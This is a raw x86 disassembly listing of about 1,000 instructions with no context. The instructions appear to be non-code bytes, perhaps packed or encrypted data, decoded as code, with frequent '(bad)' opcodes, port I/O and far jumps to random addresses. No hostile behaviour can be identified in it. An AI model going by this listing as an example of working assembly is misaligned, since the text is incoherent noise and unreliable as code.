  446a57:	and    al,0x5e
  446a59:	loopne 0x446a78
  446a5b:	div    DWORD PTR [ebx+0x71]
  446a5e:	and    ah,BYTE PTR [ecx-0x5bf68b13]
  446a64:	imul   edx,esi,0xfffffff0
  446a67:	adc    eax,0xe00c1a5e
  446a6c:	jbe    0x446ade
  446a6e:	jo     0x446a1b
  446a70:	cmp    esi,DWORD PTR [ecx-0x6cad5f38]
  446a76:	loop   0x446ae6
  446a78:	out    dx,al
  446a79:	xor    al,0xbe
  446a7b:	fcomp  QWORD PTR [esi-0x25]
  446a7e:	das    
  446a7f:	jns    0x446ac5
  446a81:	ins    DWORD PTR es:[edi],dx
  446a82:	scas   eax,DWORD PTR es:[edi]
  446a83:	aad    0x75
  446a85:	pusha  
  446a86:	cmp    bl,cl
  446a88:	mov    sp,0xb2ea
  446a8c:	mov    edx,0x11f0e970
  446a91:	xchg   edi,eax
  446a92:	stc    
  446a93:	pop    ebx
  446a94:	pop    esi
  446a95:	add    DWORD PTR [ecx],edx
  446a97:	enter  0x9796,0xda
  446a9b:	lods   al,BYTE PTR ds:[esi]
  446a9c:	mov    eax,ds:0x52f46e8f
  446aa1:	pop    edi
  446aa2:	je     0x446a96
  446aa4:	or     DWORD PTR [esi],ecx
  446aa6:	out    dx,al
  446aa7:	push   ebp
  446aa8:	dec    eax
  446aa9:	stos   DWORD PTR es:[edi],eax
  446aaa:	mov    cl,0x35
  446aac:	inc    eax
  446aad:	xchg   edi,eax
  446aae:	sub    BYTE PTR [ecx+0x4853fc46],ah
  446ab4:	adc    bh,BYTE PTR [ebx+0x535e2da7]
  446aba:	xchg   esi,eax
  446abb:	mov    ah,BYTE PTR [ebx-0x58]
  446abe:	aas    
  446abf:	nop
  446ac0:	xor    ah,BYTE PTR ds:0x7e26a244
  446ac6:	pusha  
  446ac7:	inc    ebp
  446ac8:	xor    bl,dh
  446aca:	pop    esp
  446acb:	popa   
  446acc:	xchg   BYTE PTR [ebx-0x11],dl
  446acf:	jge    0x446a7e
  446ad1:	sub    edx,ecx
  446ad3:	aas    
  446ad4:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446ad6:	out    0xc8,eax
  446ad8:	int3   
  446ad9:	add    ecx,esi
  446adb:	xor    esi,DWORD PTR [ecx]
  446add:	imul   ecx,DWORD PTR [ecx+0x6e88c6a9],0xffffffec
  446ae4:	mov    edi,0x4c68d506
  446ae9:	call   0xa10e:0x8f400df3
  446af0:	enter  0x1a0a,0xb6
  446af4:	fsub   DWORD PTR [eax+0x78]
  446af7:	jb     0x446ad4
  446af9:	popf   
  446afa:	call   DWORD PTR [ebp-0x2400bbdc]
  446b00:	not    ebp
  446b02:	stos   DWORD PTR es:[edi],eax
  446b03:	sbb    eax,0x6995fd7a
  446b08:	out    dx,al
  446b09:	push   ss
  446b0a:	retf   0xaba0
  446b0d:	cmp    edi,DWORD PTR [ecx]
  446b0f:	cmp    DWORD PTR [eax+esi*1],ebx
  446b12:	add    BYTE PTR [eax],bl
  446b14:	pop    edi
  446b15:	push   ebx
  446b16:	pop    es
  446b17:	or     al,0xf2
  446b19:	xor    BYTE PTR [esi+0x1525230],0xa1
  446b20:	call   0x502cf34b
  446b25:	adc    bl,BYTE PTR [ecx]
  446b27:	neg    BYTE PTR [esi+0x6d]
  446b2a:	and    DWORD PTR [edi],esi
  446b2c:	or     al,0x55
  446b2e:	jb     0x446b00
  446b30:	gs popa 
  446b32:	adc    al,0xf
  446b34:	lahf   
  446b35:	add    al,0x16
  446b37:	pop    ebx
  446b38:	jmp    0xefc4:0x1ef6ee87
  446b3f:	sub    al,0xe0
  446b41:	push   edx
  446b42:	jo     0x446acd
  446b44:	adc    BYTE PTR [ebx],ah
  446b46:	js     0x446b89
  446b48:	(bad)  [eax]
  446b4a:	and    eax,0x1ee0fece
  446b4f:	sub    BYTE PTR [eax+0x3c],cl
  446b52:	(bad)  
  446b53:	jnp    0x446bcb
  446b55:	inc    ebx
  446b56:	enter  0xb694,0xa0
  446b5a:	and    al,0x4a
  446b5c:	pop    eax
  446b5d:	aam    0xd9
  446b5f:	dec    esi
  446b60:	push   ecx
  446b61:	in     eax,dx
  446b62:	outs   dx,BYTE PTR ds:[esi]
  446b63:	out    0x9b,al
  446b65:	cdq    
  446b66:	cmp    ecx,DWORD PTR fs:[esi-0x728f374e]
  446b6d:	inc    ebx
  446b6e:	ret    
  446b6f:	sub    al,0x80
  446b71:	and    dh,dh
  446b73:	nop
  446b74:	les    esi,FWORD PTR [ebx]
  446b76:	jbe    0x446bf1
  446b78:	pop    esi
  446b79:	or     edx,DWORD PTR [ecx+0x1e295fc7]
  446b7f:	mov    ch,0xe3
  446b81:	inc    esp
  446b82:	push   es
  446b83:	pop    ebx
  446b84:	cdq    
  446b85:	in     eax,0x6e
  446b87:	adc    eax,0x4a5072ce
  446b8c:	and    BYTE PTR [ebp-0x11],bl
  446b8f:	push   es
  446b90:	mov    bl,0x4
  446b92:	jne    0x446b95
  446b94:	adc    ebx,esi
  446b96:	sbb    edi,DWORD PTR [edx-0x52]
  446b99:	pusha  
  446b9a:	mov    bl,0xac
  446b9c:	enter  0x8b4a,0x3
  446ba0:	aam    0x80
  446ba2:	out    0x8f,eax
  446ba4:	jl     0x446b47
  446ba6:	ins    BYTE PTR es:[edi],dx
  446ba7:	shr    BYTE PTR [esi],cl
  446ba9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446baa:	gs pop ds
  446bac:	jno    0x446c0d
  446bae:	xor    bl,BYTE PTR [edi+0x1c]
  446bb1:	jb     0x446b57
  446bb3:	cmc    
  446bb4:	ins    DWORD PTR es:[edi],dx
  446bb5:	mov    ecx,0x982c74e
  446bba:	jmp    0xe918a36e
  446bbf:	int    0xde
  446bc1:	add    eax,DWORD PTR [ebx+eiz*2-0x20]
  446bc5:	push   edx
  446bc6:	sub    BYTE PTR [edi-0x50],cl
  446bc9:	mov    ecx,0xcc7e9c70
  446bce:	inc    ebx
  446bcf:	inc    ebp
  446bd0:	lds    eax,FWORD PTR [edi]
  446bd2:	out    dx,al
  446bd3:	pop    ds
  446bd4:	jb     0x446bb8
  446bd6:	or     DWORD PTR ss:[eax+eax*2],ecx
  446bda:	(bad)  
  446bdb:	jnp    0x446b96
  446bdd:	pusha  
  446bde:	mov    edx,DWORD PTR [eax+0x7d]
  446be1:	xchg   edi,eax
  446be2:	jnp    0x446be2
  446be4:	ret    0x27d
  446be7:	mov    BYTE PTR [ebx],bh
  446be9:	jb     0x446c59
  446beb:	jmp    0x446c60
  446bed:	jo     0x446c64
  446bef:	sbb    al,0x65
  446bf1:	popa   
  446bf2:	icebp  
  446bf3:	test   BYTE PTR [ecx+0x55a98e91],dh
  446bf9:	jmp    0xf96213ec
  446bfe:	pop    esp
  446bff:	frstor [ecx+0xc948920]
  446c05:	adc    BYTE PTR [esi+0x61],al
  446c08:	jbe    0x446b9a
  446c0a:	inc    ebp
  446c0b:	jne    0x446c6b
  446c0d:	pop    esp
  446c0e:	ret    0x9c9
  446c11:	mov    eax,ds:0x5a1df306
  446c16:	(bad)  
  446c17:	mov    al,0xf5
  446c19:	or     DWORD PTR [ecx],0x459b9e7f
  446c1f:	and    bh,0x1a
  446c22:	out    dx,al
  446c23:	ret    
  446c24:	dec    ebp
  446c25:	rcr    DWORD PTR [esi+0x58bc8159],1
  446c2b:	jmp    0x2db9cd3c
  446c30:	mov    DWORD PTR [ebp-0x1e6d1ae0],ebx
  446c36:	out    dx,al
  446c37:	ret    0xbe4b
  446c3a:	ret    
  446c3b:	arpl   WORD PTR gs:[edi],di
  446c3e:	xchg   DWORD PTR [ecx+eax*8+0x7c9be4f6],esp
  446c45:	adc    BYTE PTR [esi-0x16],bh
  446c48:	dec    esi
  446c49:	pop    edi
  446c4a:	out    dx,al
  446c4b:	mov    es,WORD PTR [ecx]
  446c4d:	add    DWORD PTR [esi],eax
  446c4f:	arpl   WORD PTR [ecx],sp
  446c51:	paddw  mm4,QWORD PTR [eax-0x3f158e76]
  446c58:	and    eax,0x5e9d9454
  446c5d:	test   DWORD PTR [edx],eax
  446c5f:	pop    eax
  446c60:	and    BYTE PTR [edi-0x32],0xbe
  446c64:	xchg   edi,eax
  446c65:	pusha  
  446c66:	sbb    BYTE PTR [esi-0xb],dl
  446c69:	sbb    BYTE PTR [edi],ch
  446c6b:	shl    DWORD PTR [ebx],1
  446c6d:	jmp    0x41e76740
  446c72:	ins    BYTE PTR es:[edi],dx
  446c73:	je     0x446cda
  446c75:	popa   
  446c76:	or     eax,0x9e249b05
  446c7b:	xchg   esp,eax
  446c7c:	or     al,0xfe
  446c7e:	sti    
  446c7f:	leave  
  446c80:	ja     0x446ce1
  446c82:	out    dx,al
  446c83:	and    BYTE PTR [ecx+0x7dc43de2],dh
  446c89:	pusha  
  446c8a:	jge    0x446cfa
  446c8c:	rol    ch,1
  446c8e:	xor    BYTE PTR [edi+0x29],dl
  446c91:	cmp    ebp,esi
  446c93:	xor    edi,ebx
  446c95:	add    BYTE PTR [edx],cl
  446c97:	dec    edx
  446c98:	add    esp,esi
  446c9a:	jp     0x446c3d
  446c9c:	leave  
  446c9d:	mov    DWORD PTR [eax],eax
  446c9f:	jb     0x446c7d
  446ca1:	push   eax
  446ca2:	xchg   edx,eax
  446ca3:	out    0x5e,al
  446ca5:	cmp    ebp,DWORD PTR [ebp+0x6d096a43]
  446cab:	xchg   DWORD PTR [ecx],ecx
  446cad:	and    esp,edi
  446caf:	mov    al,ds:0x8ef0e4c8
  446cb4:	dec    esp
  446cb5:	pop    ebp
  446cb6:	push   ds
  446cb7:	inc    edx
  446cb8:	out    dx,al
  446cb9:	clc    
  446cba:	out    0xee,eax
  446cbc:	pusha  
  446cbd:	fidiv  WORD PTR [edx]
  446cbf:	call   0x4a06:0xd522411e
  446cc6:	ins    BYTE PTR es:[edi],dx
  446cc7:	(bad)  
  446cc8:	out    0x56,eax
  446cca:	fmul   QWORD PTR [edx-0x5b7bb64e]
  446cd0:	add    esi,ebp
  446cd2:	jmp    0x1e7d:0x231c6ddc
  446cd9:	jns    0x446cc9
  446cdb:	stos   BYTE PTR es:[edi],al
  446cdc:	cmp    esi,eax
  446cde:	adc    DWORD PTR [edx],eax
  446ce0:	ds cmp al,0xdd
  446ce3:	mov    ds:0xe6055050,al
  446ce8:	call   0xdff7:0x441aceba
  446cef:	loop   0x446d42
  446cf1:	dec    esp
  446cf2:	pop    eax
  446cf3:	stos   BYTE PTR es:[edi],al
  446cf4:	cmp    edx,DWORD PTR [ecx+0x59f0a442]
  446cfa:	out    dx,eax
  446cfb:	pop    ecx
  446cfc:	mov    dh,0x22
  446cfe:	cs iret 
  446d00:	add    ecx,esi
  446d02:	out    dx,al
  446d03:	fs aam 0xb7
  446d06:	push   edi
  446d07:	cdq    
  446d08:	fstp   QWORD PTR [ebx+0x6c19958a]
  446d0e:	in     eax,dx
  446d0f:	aas    
  446d10:	pop    ebx
  446d11:	cmp    dh,cl
  446d13:	(bad)
  446d16:	xchg   DWORD PTR [eax],esi
  446d18:	ss sbb esp,esi
  446d1b:	pop    edx
  446d1c:	mov    eax,0x5e16b85e
  446d21:	jge    0x446d78
  446d23:	clc    
  446d24:	cwde   
  446d25:	rcl    DWORD PTR [eax],0xa1
  446d28:	mov    al,0x77
  446d2a:	ja     0x446ce9
  446d2c:	popa   
  446d2d:	daa    
  446d2e:	dec    esi
  446d2f:	mov    ds:0x53b8a846,al
  446d34:	pop    ebp
  446d35:	push   edi
  446d36:	cmc    
  446d37:	cli    
  446d38:	out    dx,eax
  446d39:	fwait
  446d3a:	mov    dh,0x34
  446d3c:	sahf   
  446d3d:	and    al,0x42
  446d3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446d40:	(bad)  
  446d41:	jae    0x446cc3
  446d43:	add    bl,bl
  446d45:	(bad)  
  446d46:	pop    esi
  446d47:	or     ebx,edx
  446d49:	(bad)  ds:[esi]
  446d4c:	pop    esi
  446d4d:	xchg   esp,eax
  446d4e:	ja     0x446d98
  446d50:	hlt    
  446d51:	inc    eax
  446d52:	pop    edx
  446d53:	or     eax,0x167160e3
  446d58:	lea    ebx,[esi-0x276c2b1d]
  446d5e:	(bad)  
  446d5f:	stc    
  446d60:	pop    ebx
  446d61:	stos   BYTE PTR es:[edi],al
  446d62:	adc    ebp,DWORD PTR cs:[esi]
  446d65:	jo     0x446d06
  446d67:	inc    eax
  446d68:	and    DWORD PTR [edx],esp
  446d6a:	iret   
  446d6b:	mov    al,ds:0x9b850f39
  446d70:	rol    DWORD PTR ds:0x8759ca7b,1
  446d76:	dec    ecx
  446d77:	dec    ebp
  446d78:	or     BYTE PTR ds:0x193e6fee,ch
  446d7e:	mov    esp,0xdd5fe22e
  446d83:	push   ebp
  446d84:	repz sbb ebp,DWORD PTR [esi+0x5e98d085]
  446d8b:	inc    esp
  446d8c:	pop    esi
  446d8d:	rol    BYTE PTR [ecx-0x27],1
  446d90:	into   
  446d91:	fimul  WORD PTR [esi]
  446d93:	jnp    0x446e0a
  446d95:	pusha  
  446d96:	mov    DWORD PTR [ebp-0x23],ecx
  446d99:	int    0x4d
  446d9b:	mov    bl,0x48
  446d9d:	imul   ebp,esi,0x2f7a4e28
  446da3:	mov    esi,0x8e4e3cb0
  446da8:	shr    BYTE PTR [edi+0x3d6eb18a],1
  446dae:	test   BYTE PTR [ecx+edx*2-0x64643dca],dl
  446db5:	hlt    
  446db6:	push   esp
  446db7:	mov    ah,0x8e
  446db9:	jne    0x446dac
  446dbb:	inc    ecx
  446dbc:	stos   DWORD PTR es:[edi],eax
  446dbd:	pusha  
  446dbe:	and    bl,BYTE PTR [esi+0x68]
  446dc1:	cmp    DWORD PTR ds:0xee65e523,0x25f8af1f
  446dcb:	sub    eax,0xa16a8cb1
  446dd0:	inc    edx
  446dd1:	inc    ebx
  446dd2:	fnstcw WORD PTR ds:0xfbe6aca1
  446dd8:	pop    esi
  446dd9:	push   ss
  446dda:	cdq    
  446ddb:	mov    WORD PTR [ecx-0x76d70b5a],ss
  446de1:	pop    ebp
  446de2:	lods   eax,DWORD PTR ds:[esi]
  446de3:	sub    eax,0xe16ea363
  446de8:	ficomp WORD PTR [ecx-0x4107aeb5]
  446dee:	jmp    0x446e3a
  446df0:	std    
  446df1:	test   eax,0xd09481ca
  446df6:	xchg   ecx,eax
  446df7:	inc    esp
  446df8:	inc    eax
  446df9:	sub    eax,0x32d0a0c9
  446dfe:	mov    cl,0xe9
  446e00:	xor    ecx,DWORD PTR [esi-0x3a]
  446e03:	mov    DWORD PTR [esi-0x67],ebx
  446e06:	xchg   bx,ax
  446e08:	jle    0x446d92
  446e0a:	outs   dx,BYTE PTR ds:[esi]
  446e0b:	dec    ebx
  446e0c:	lods   eax,DWORD PTR ds:[esi]
  446e0d:	pusha  
  446e0e:	xchg   ebp,eax
  446e0f:	mov    ah,0x51
  446e11:	lods   al,BYTE PTR ds:[esi]
  446e12:	hlt    
  446e13:	xor    bh,BYTE PTR ds:0xae96eeee
  446e19:	inc    eax
  446e1a:	adc    al,0x98
  446e1c:	clc    
  446e1d:	sar    BYTE PTR [esi-0x5b],cl
  446e20:	sub    DWORD PTR [ecx+0x68],0xf7e16205
  446e27:	(bad)  
  446e28:	lods   al,BYTE PTR ds:[esi]
  446e29:	pop    ebx
  446e2a:	out    dx,al
  446e2b:	dec    eax
  446e2c:	retf   0xc7e5
  446e2f:	fistp  DWORD PTR [edx-0x235fc655]
  446e35:	cli    
  446e36:	cmp    al,0x55
  446e38:	mov    esp,0x5eb55c23
  446e3d:	sub    eax,0x95d13f12
  446e42:	(bad)  
  446e43:	cwde   
  446e44:	(bad)  
  446e45:	lea    ax,[ebx]
  446e48:	retf   0x3ae0
  446e4b:	adc    BYTE PTR [esi+0x5f],bl
  446e4e:	hlt    
  446e4f:	scas   al,BYTE PTR es:[edi]
  446e50:	dec    edi
  446e51:	mov    esp,0xe65ee401
  446e56:	sbb    esi,edi
  446e58:	leave  
  446e59:	sub    DWORD PTR [edi-0x3e],ebp
  446e5c:	and    ah,BYTE PTR [ecx-0x15]
  446e5f:	jae    0x446e88
  446e61:	jl     0x446e2a
  446e63:	or     eax,DWORD PTR [esi+0x634cdb0e]
  446e69:	mov    eax,ds:0x436a0999
  446e6e:	out    dx,al
  446e6f:	mov    al,0x7d
  446e71:	jbe    0x446e47
  446e73:	push   ss
  446e74:	daa    
  446e75:	xor    BYTE PTR [ecx-0x19d5b861],ch
  446e7b:	imul   edx,esi,0xae412646
  446e81:	dec    esi
  446e82:	out    dx,eax
  446e83:	mov    dh,0xdf
  446e85:	gs hlt 
  446e87:	shr    BYTE PTR [edx],0xd9
  446e8a:	das    
  446e8b:	in     al,dx
  446e8c:	ret    
  446e8d:	pusha  
  446e8e:	jno    0x446e76
  446e90:	push   edx
  446e91:	mov    cl,0x96
  446e93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446e94:	test   BYTE PTR [edi],bh
  446e96:	(bad)  
  446e98:	fs inc ebx
  446e9a:	test   BYTE PTR [ecx-0x12],ah
  446e9d:	add    BYTE PTR [edx*2-0x5651445f],0x1d
  446ea5:	pop    eax
  446ea6:	out    dx,al
  446ea7:	inc    eax
  446ea8:	lock rcl BYTE PTR [si],0x5b
  446ead:	mov    esi,ebp
  446eaf:	fs jne 0x446e5d
  446eb2:	adc    BYTE PTR [esi-0x1e],bl
  446eb5:	mov    edx,0xa187a151
  446eba:	adc    esi,edi
  446ebc:	pop    es
  446ebd:	scas   eax,DWORD PTR es:[edi]
  446ebe:	sub    al,0x18
  446ec0:	pop    esi
  446ec1:	daa    
  446ec2:	test   BYTE PTR [esi+esi*2+0x4],ch
  446ec6:	mov    al,0x25
  446ec8:	inc    esp
  446ec9:	push   esi
  446eca:	pusha  
  446ecb:	scas   al,BYTE PTR es:[edi]
  446ecc:	mov    BYTE PTR [edi+0x6e],bl
  446ecf:	jmp    0x10620696
  446ed4:	push   cs
  446ed5:	int    0x5e
  446ed7:	xchg   ebp,eax
  446ed8:	pop    esi
  446ed9:	(bad)  
  446eda:	fs (bad) 
  446edc:	pop    ss
  446edd:	std    
  446ede:	mov    eax,0x1bf0a18
  446ee3:	mov    al,ds:0xb7a3f347
  446ee8:	push   ds
  446ee9:	pop    ebx
  446eea:	push   edx
  446eeb:	jae    0x446f02
  446eed:	adc    al,BYTE PTR [ecx]
  446eef:	jmp    0x446eb1
  446ef1:	pop    esi
  446ef2:	cs pusha 
  446ef4:	push   esi
  446ef5:	mov    bh,0xcc
  446ef7:	fsub   QWORD PTR [eax]
  446ef9:	xor    DWORD PTR [eax],esi
  446efb:	mov    eax,ds:0x6fc4df8a
  446f00:	arpl   di,si
  446f02:	in     eax,dx
  446f03:	stc    
  446f04:	pop    ebx
  446f05:	fld    DWORD PTR [ebx-0x32]
  446f08:	ret    
  446f09:	sahf   
  446f0a:	jge    0x446f5a
  446f0c:	push   ecx
  446f0d:	inc    eax
  446f0e:	into   
  446f0f:	and    dh,BYTE PTR [edi]
  446f11:	popa   
  446f12:	imul   ecx,DWORD PTR [eax+0x11e32244],0xd9ee046e
  446f1c:	(bad)  
  446f1d:	lahf   
  446f1e:	fidiv  DWORD PTR [ecx+edx*2]
  446f21:	jnp    0x446f60
  446f23:	test   eax,0x77ee3fae
  446f28:	cmp    dh,BYTE PTR [edx]
  446f2a:	mov    edx,0xeece6fde
  446f2f:	loop   0x446eff
  446f31:	add    eax,0x5309cb01
  446f36:	test   DWORD PTR [ecx-0x19c7c68],esp
  446f3c:	inc    edi
  446f3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  446f3e:	push   ebx
  446f3f:	fcomp  DWORD PTR [esi+0x30af9d24]
  446f45:	or     ebx,edx
  446f47:	js     0x446fac
  446f49:	push   edx
  446f4a:	and    eax,0x8ec87677
  446f4f:	or     bl,BYTE PTR [edx+0x63577c33]
  446f55:	and    eax,0x39ef470f
  446f5a:	sub    edx,DWORD PTR [edi-0x4d544022]
  446f60:	inc    ecx
  446f61:	push   esi
  446f62:	out    dx,eax
  446f63:	push   0xffffffa2
  446f65:	adc    eax,0xff596dee
  446f6a:	sub    eax,0x4ebc2311
  446f6f:	dec    edx
  446f70:	fs popa 
  446f72:	lea    ebp,[eax-0x5d]
  446f75:	dec    ebp
  446f76:	popa   
  446f77:	push   ds
  446f78:	cmp    al,0x42
  446f7a:	out    dx,al
  446f7b:	jno    0x446fe5
  446f7d:	adc    al,ah
  446f7f:	mov    ds:0xa04727d8,al
  446f84:	xchg   ecx,eax
  446f85:	pop    eax
  446f86:	push   ebp
  446f87:	data16 stc 
  446f89:	dec    ecx
  446f8a:	mov    edx,0x717d5020
  446f8f:	aam    0x5e
  446f91:	fwait
  446f92:	das    
  446f93:	adc    DWORD PTR [edx],eax
  446f95:	jle    0x446f42
  446f97:	jno    0x446f19
  446f99:	pusha  
  446f9a:	mov    ah,0x55
  446f9c:	xchg   BYTE PTR [ebx+esi*4],ch
  446f9f:	dec    esp
  446fa0:	rep stos DWORD PTR es:[edi],eax
  446fa2:	lock mov ecx,0x37e1da7d
  446fa8:	push   ecx
  446fa9:	inc    ebx
  446faa:	add    dh,cl
  446fac:	adc    cl,dl
  446fae:	out    dx,al
  446faf:	sub    BYTE PTR [esi],bl
  446fb1:	aam    0x54
  446fb3:	fld    TBYTE PTR [eax+eiz*2+0x32f001f1]
  446fba:	sbb    dh,BYTE PTR [ebp+0x7a]
  446fbd:	pop    ecx
  446fbe:	out    0xd3,eax
  446fc0:	test   eax,0xab0ae9c7
  446fc5:	dec    eax
  446fc6:	mov    esi,0x9e027b85
  446fcb:	mov    eax,ds:0xf3be248f
  446fd0:	inc    edi
  446fd1:	fmul   QWORD PTR [edi-0x112b891e]
  446fd7:	popf   
  446fd8:	push   ebx
  446fd9:	adc    eax,DWORD PTR [ebx+esi*4-0x75]
  446fdd:	sbb    BYTE PTR [esi-0x18d2fe5f],dl
  446fe3:	ss ja  0x447048
  446fe6:	add    DWORD PTR [ebp+0x5e],0xfffffffb
  446fea:	mov    eax,0x280c1eb0
  446fef:	repz lahf 
  446ff1:	pusha  
  446ff2:	(bad)  
  446ff3:	fisttp QWORD PTR [esi]
  446ff5:	repz sti 
  446ff7:	sub    bh,BYTE PTR [eax+0x4b]
  446ffa:	and    DWORD PTR [edi-0x76],ebp
  446ffd:	loopne 0x447020
  446fff:	dec    esi
  447000:	mov    ebx,0xe5bdb567
  447005:	push   edx
  447006:	repz inc ecx
  447008:	ror    DWORD PTR [edx-0x5fcccf12],cl
  44700e:	push   ecx
  44700f:	pop    ebx
  447010:	pop    esi
  447011:	(bad)  
  447013:	push   es
  447014:	and    al,0x8c
  447016:	pop    edx
  447017:	cwde   
  447018:	mov    eax,ds:0x78af7a60
  44701d:	mov    al,ds:0xaf707023
  447022:	pop    ds
  447023:	xchg   ebp,eax
  447024:	mov    esi,0xa9fb8760
  447029:	mov    ebx,0x5a48045b
  44702e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44702f:	mov    ebx,gs
  447031:	mov    WORD PTR [ecx-0x383ba740],gs
  447037:	jle    0x447097
  447039:	xor    DWORD PTR [ebx+esi*1-0x6caa4ff3],edx
  447040:	or     DWORD PTR [edx+0x35],edx
  447043:	cmp    ecx,esp
  447045:	fisubr WORD PTR [esi-0xe]
  447048:	adc    ebp,DWORD PTR [edi+0x18]
  44704b:	ss pop esi
  44704d:	fwait
  44704e:	cmp    eax,0xb87b58dc
  447053:	aam    0x63
  447055:	popa   
  447056:	iret   
  447057:	dec    ebx
  447058:	mov    ds:0x7c61f82f,eax
  44705d:	dec    eax
  44705e:	out    dx,al
  44705f:	out    dx,eax
  447060:	std    
  447061:	dec    esi
  447062:	mov    cl,0xf4
  447064:	dec    edx
  447065:	xchg   ebp,eax
  447066:	push   0xffffffa5
  447068:	adc    eax,0xe892a08e
  44706d:	mov    al,ds:0x56fb85cb
  447072:	out    dx,al
  447073:	xor    eax,0x1854165c
  447078:	add    ebx,edx
  44707a:	pop    ds
  44707b:	mov    eax,ds:0x9a96d14a
  447080:	not    ebx
  447082:	scas   al,BYTE PTR es:[edi]
  447083:	in     eax,0x5e
  447085:	test   BYTE PTR [eax+0x6],ch
  447088:	push   ebp
  447089:	xchg   esp,eax
  44708a:	jne    0x447056
  44708c:	js     0x4470df
  44708e:	push   ss
  44708f:	mov    ebp,0x9b6e28a6
  447094:	inc    ebp
  447095:	fcmovb st,st(3)
  447097:	repnz pop ebp
  447099:	lea    esp,[esi-0x2a]
  44709c:	ja     0x4470a7
  44709e:	icebp  
  44709f:	mov    dl,0x82
  4470a1:	sub    eax,0x4beba134
  4470a6:	lds    edx,FWORD PTR [edx-0x2494496b]
  4470ac:	jmp    0x44704b
  4470ae:	out    dx,al
  4470af:	out    dx,eax
  4470b0:	out    0x65,eax
  4470b2:	fadd   QWORD PTR [edx]
  4470b4:	pop    eax
  4470b5:	adc    eax,0x66c3a0c4
  4470ba:	(bad)  
  4470bb:	retf   
  4470bc:	repnz rol BYTE PTR ds:0xb97e5eec,1
  4470c3:	int3   
  4470c4:	inc    esi
  4470c5:	fstp   DWORD PTR ds:0xd7a4bdd4
  4470cb:	enter  0x266b,0xfc
  4470cf:	cmp    edx,DWORD PTR [ecx-0x14c9aaf]
  4470d5:	dec    esi
  4470d6:	and    eax,ebp
  4470d8:	rcl    BYTE PTR [ebx],cl
  4470da:	out    dx,al
  4470db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4470dc:	mov    WORD PTR [eax+0x5],es
  4470df:	fs jne 0x44712f
  4470e2:	mul    BYTE PTR [eax+0x174710f1]
  4470e8:	and    BYTE PTR ds:0xb65d4f23,0x15
  4470ef:	sub    eax,0x110e5b88
  4470f4:	imul   esi,DWORD PTR [eax+0x6080bbcb],0x5
  4470fb:	xchg   BYTE PTR [ecx+0x610826f4],dh
  447101:	in     al,dx
  447102:	out    dx,al
  447103:	lea    ecx,[eax]
  447105:	aam    0x94
  447107:	adc    al,0x10
  447109:	(bad)  
  44710a:	or     esp,DWORD PTR [ecx+0x30494d15]
  447110:	and    ah,BYTE PTR [ebx+ebx*1]
  447113:	in     al,dx
  447114:	pop    esi
  447115:	pop    esi
  447116:	inc    esp
  447117:	add    eax,edi
  447119:	fisub  WORD PTR [ebx-0x42]
  44711c:	dec    esi
  44711d:	or     ecx,ebp
  44711f:	lahf   
  447120:	xor    DWORD PTR [ebp+0x72f1a6eb],esi
  447126:	adc    ebx,DWORD PTR [edi+0x76616aae]
  44712c:	or     BYTE PTR gs:[ecx+0x67a9d133],ch
  447133:	pushf  
  447134:	mov    eax,0xcfc38840
  447139:	mov    ebp,edx
  44713b:	xchg   ebx,eax
  44713c:	xlat   BYTE PTR ds:[ebx]
  44713d:	cmp    BYTE PTR [ebx],0x3a
  447140:	fsubrp st(3),st
  447142:	or     esi,DWORD PTR [edi+ebx*1-0x5e]
  447146:	push   ds
  447147:	loopne 0x4470ea
  447149:	inc    esp
  44714a:	xor    ah,bl
  44714c:	frstor [eax+0x5e]
  44714f:	(bad)  
  447151:	retf   0x4426
  447154:	pop    esi
  447155:	cli    
  447156:	mov    ebx,0x10f2c6b3
  44715b:	lea    edi,[ebp*4-0x65885c13]
  447162:	stos   DWORD PTR es:[edi],eax
  447163:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  447164:	xchg   ebp,eax
  447165:	mov    cl,0x56
  447167:	mov    ah,BYTE PTR [ebp+0x51]
  44716a:	out    dx,al
  44716b:	push   0xffffffb8
  44716d:	int    0x8e
  44716f:	pop    esi
  447170:	enter  0x4da5,0xa1
  447174:	ret    
  447175:	mov    BYTE PTR [edi+0xd],ah
  447178:	pop    ds
  447179:	sbb    ch,0xa
  44717c:	pop    esi
  44717d:	push   edi
  44717e:	out    dx,eax
  44717f:	fs mov ecx,0x32b6762c
  447185:	mov    ah,0xe
  447187:	aas    
  447188:	adc    dh,BYTE PTR [ebx+0x72bfa150]
  44718e:	push   ss
  44718f:	outs   dx,BYTE PTR ds:[esi]
  447190:	jbe    0x4471f5
  447192:	lods   al,BYTE PTR ds:[esi]
  447193:	adc    dh,0x3
  447196:	out    dx,al
  447197:	aam    0x1b
  447199:	inc    edi
  44719b:	out    dx,al
  44719c:	pop    ds
  44719d:	add    eax,0xea21a11a
  4471a2:	xchg   esp,eax
  4471a3:	cld    
  4471a4:	mov    esi,0x5a81db8e
  4471a9:	in     al,0xae
  4471ab:	add    eax,0x822e913c
  4471b0:	xor    esp,DWORD PTR [edi]
  4471b2:	and    BYTE PTR [edi-0x5e930ed1],bh
  4471b8:	test   DWORD PTR [edx+0x63],0xee40a27e
  4471bf:	dec    ebp
  4471c0:	jmp    0xa77:0x8a77f25b
  4471c7:	mov    ebp,0xa057c193
  4471cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4471cd:	scas   al,BYTE PTR es:[edi]
  4471ce:	dec    esi
  4471cf:	cmp    al,0x90
  4471d1:	leave  
  4471d2:	fistp  QWORD PTR [ebx-0x1727f608]
  4471d8:	pop    esi
  4471d9:	out    0xb5,al
  4471db:	lods   eax,DWORD PTR ds:[esi]
  4471dc:	push   edi
  4471dd:	into   
  4471de:	mov    esi,DWORD PTR [edi]
  4471e0:	sub    ebp,DWORD PTR [ebx+0x1069a0a9]
  4471e6:	(bad)  
  4471e7:	bound  esi,QWORD PTR [ecx+0x28]
  4471ea:	dec    edx
  4471eb:	call   0x2e89:0x5c9ff25f
  4471f2:	inc    ecx
  4471f3:	sub    al,BYTE PTR [edx+esi*2-0x32]
  4471f7:	fwait
  4471f8:	xor    DWORD PTR [edi-0x25],ecx
  4471fb:	mov    ds:0xe03b59c5,eax
